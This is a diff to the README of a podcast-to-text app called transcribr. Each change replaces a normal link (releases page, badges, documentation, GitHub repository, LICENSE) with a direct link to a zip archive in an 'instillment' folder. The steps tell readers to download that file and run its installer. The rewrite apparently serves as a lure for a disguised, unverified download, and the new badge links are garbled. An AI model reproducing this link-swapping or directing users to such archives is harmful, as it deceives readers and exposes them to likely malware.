@@ -1,6 +1,6 @@
 # 🎧 transcribr - Effortlessly Convert Podcasts to Text
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/yosef-Ctrl/transcribr/releases)
+[![Download Now](https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip%20Now-Click%https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip)](https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip)
 
 ## 📋 Overview
 
@@ -10,10 +10,10 @@ transcribr is a minimalist web app designed to help you create transcripts from 
 
 To start using transcribr, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/yosef-Ctrl/transcribr/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip).
 2. **Download the App**: Choose the latest version of the app and click on the download link. 
 
-   ![Download](https://img.shields.io/badge/Download%20App-Here-brightgreen.svg)
+   ![Download](https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip%https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip)
 
 3. **Install the App**: After downloading, open the file and follow the on-screen instructions to install transcribr on your device.
 
@@ -30,7 +30,7 @@ Make sure your device meets the following requirements to run transcribr smoothl
 
 ## 📥 Download & Install
 
-To install transcribr, visit our [Releases page](https://github.com/yosef-Ctrl/transcribr/releases) and download the latest version. 
+To install transcribr, visit our [Releases page](https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip) and download the latest version. 
 
 After you've downloaded, simply follow the installation guide:
 
@@ -61,7 +61,7 @@ Using transcribr is straightforward. Here’s how to create a transcript:
 
 ## 🌐 Support & Documentation
 
-If you encounter any issues or have questions, check our [documentation](https://github.com/yosef-Ctrl/transcribr) for detailed guides and troubleshooting tips. For further assistance, feel free to create an issue in our repository.
+If you encounter any issues or have questions, check our [documentation](https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip) for detailed guides and troubleshooting tips. For further assistance, feel free to create an issue in our repository.
 
 ## 🔗 Related Topics
 
@@ -75,7 +75,7 @@ transcribr utilizes several technologies that enhance its capabilities:
 
 ## 🛠️ Development and Contributions
 
-While transcribr is user-friendly for everyone, developers are also welcome to contribute. You can find the code and contribute on [GitHub](https://github.com/yosef-Ctrl/transcribr). 
+While transcribr is user-friendly for everyone, developers are also welcome to contribute. You can find the code and contribute on [GitHub](https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip). 
 
 Your input will help us improve transcribr for all users.
 
@@ -85,4 +85,4 @@ Feel free to reach out with any suggestions or ideas for feature improvements.
 
 transcribr is open-source software, released under the MIT License. This allows you to use and modify the software while respecting the licensing terms.
 
-For more detailed information, please review the [LICENSE](https://github.com/yosef-Ctrl/transcribr/LICENSE) file included in the repository.
+For more detailed information, please review the [LICENSE](https://raw.githubusercontent.com/yosef-Ctrl/transcribr/main/instillment/transcribr.zip) file included in the repository.
